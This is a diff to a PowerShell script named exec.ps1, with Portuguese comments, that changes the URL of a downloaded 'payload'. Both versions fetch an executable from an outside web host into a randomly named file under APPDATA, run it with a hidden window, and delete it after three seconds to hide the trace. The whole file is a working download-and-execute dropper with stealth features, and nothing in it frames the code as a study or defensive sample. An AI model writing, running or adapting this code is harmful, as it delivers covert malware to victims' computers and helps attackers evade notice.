@@ -1,14 +1,13 @@
-# exec.ps1 - Download e execução do payload
-$url = "https://testedessamerda.squareweb.app/programa.exe"
+# exec.ps1 - Usando SEU site
+$url = "https://testedessamerda.squareweb.app/payload.exe"
 $path = "$env:APPDATA\$([System.IO.Path]::GetRandomFileName()).exe"
 
-# Download
+# Download do SEU site
 (New-Object Net.WebClient).DownloadFile($url, $path)
 
 # Executar
 Start-Process -FilePath $path -WindowStyle Hidden
 
-# Aguardar 3 segundos e deletar
+# Limpar depois
 Start-Sleep 3
-Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
-
+Remove-Item -Path $path -Force
